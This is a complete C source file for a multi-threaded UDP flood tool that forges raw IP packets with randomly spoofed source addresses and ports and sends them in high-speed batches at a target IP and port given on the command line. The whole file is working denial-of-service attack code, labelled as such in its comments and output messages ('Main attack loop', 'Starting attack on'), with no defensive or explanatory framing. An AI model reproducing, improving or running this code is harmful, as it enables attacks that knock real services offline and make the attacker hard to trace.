#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sched.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdatomic.h>

// Use a high batch size for sendmmsg for maximum performance
#define VLEN 256
// Max packet size
#define MAX_PKT_SIZE 1500

// Global flag to signal threads to stop
atomic_bool attack_running = true;

// Thread arguments structure
typedef struct {
    int thread_id;
    struct sockaddr_in target_addr;
    int packet_size;
    uint32_t dest_ip;
    uint16_t dest_port;
} thread_args_t;

// Function to calculate IP header checksum
unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return answer;
}

// The main worker thread function
void *flood_thread(void *args) {
    thread_args_t *thread_args = (thread_args_t *)args;
    int thread_id = thread_args->thread_id;
    int packet_size = thread_args->packet_size;
    
    // Pin this thread to a specific core
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        perror("pthread_setaffinity_np");
    }

    // Create a raw socket for this thread
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }

    // Tell the kernel we are providing the IP header
    int on = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(sock);
        return NULL;
    }

    // Allocate memory for packet buffers and message headers
    char datagram[VLEN][MAX_PKT_SIZE];
    struct iovec iov[VLEN];
    struct mmsghdr msgs[VLEN];
    
    // Seed random number generator for this thread
    unsigned int seed = time(NULL) ^ thread_id;

    // Prepare the message headers for sendmmsg
    for (int i = 0; i < VLEN; i++) {
        iov[i].iov_base = datagram[i];
        iov[i].iov_len = packet_size;
        msgs[i].msg_hdr.msg_name = &thread_args->target_addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
        msgs[i].msg_hdr.msg_iov = &iov[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
    }

    // Main attack loop
    while (attack_running) {
        // Craft a batch of packets
        for (int i = 0; i < VLEN; i++) {
            struct iphdr *iph = (struct iphdr *)datagram[i];
            struct udphdr *udph = (struct udphdr *)(datagram[i] + sizeof(struct iphdr));
            
            // Fill IP header
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = htons(packet_size);
            iph->id = htonl(rand_r(&seed));
            iph->frag_off = 0;
            iph->ttl = 255;
            iph->protocol = IPPROTO_UDP;
            iph->check = 0; // Set to 0 before calculating checksum
            iph->saddr = rand_r(&seed); // Random source IP (spoofing)
            iph->daddr = thread_args->dest_ip;

            // Fill UDP header
            udph->source = htons(rand_r(&seed) % 65535); // Random source port
            udph->dest = thread_args->dest_port;
            udph->len = htons(packet_size - sizeof(struct iphdr));
            udph->check = 0; // UDP checksum is optional

            // Fill payload with random data
            for (size_t j = sizeof(struct iphdr) + sizeof(struct udphdr); j < packet_size; j++) {
                datagram[i][j] = rand_r(&seed) % 256;
            }

            // Calculate IP checksum
            iph->check = csum((unsigned short *)datagram[i], iph->ihl * 4);
        }

        // Send the entire batch with one syscall
        sendmmsg(sock, msgs, VLEN, 0);
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 6) {
        fprintf(stderr, "Usage: %s <Target IP> <Port> <Threads> <Duration (s)> <Packet Size (bytes)>\n", argv[0]);
        return 1;
    }

    char *target_ip_str = argv[1];
    int port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    int packet_size = atoi(argv[5]);

    if (packet_size < (sizeof(struct iphdr) + sizeof(struct udphdr)) || packet_size > MAX_PKT_SIZE) {
        fprintf(stderr, "Packet size must be between %ld and %d bytes.\n", sizeof(struct iphdr) + sizeof(struct udphdr), MAX_PKT_SIZE);
        return 1;
    }

    // Prepare target address structure
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, target_ip_str, &target_addr.sin_addr) <= 0) {
        perror("inet_pton");
        return 1;
    }
    
    printf("Starting attack on %s:%d for %d seconds with %d threads.\n", target_ip_str, port, duration, num_threads);

    // Prepare thread arguments
    pthread_t threads[num_threads];
    thread_args_t thread_args[num_threads];

    for (int i = 0; i < num_threads; i++) {
        thread_args[i].thread_id = i;
        thread_args[i].target_addr = target_addr;
        thread_args[i].packet_size = packet_size;
        thread_args[i].dest_ip = target_addr.sin_addr.s_addr;
        thread_args[i].dest_port = target_addr.sin_port;
        
        if (pthread_create(&threads[i], NULL, flood_thread, &thread_args[i]) != 0) {
            perror("pthread_create");
            return 1;
        }
    }
    
    // Wait for the specified duration
    sleep(duration);
    
    // Signal threads to stop
    attack_running = false;
    
    // Wait for all threads to complete
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("Attack finished.\n");

    return 0;
}
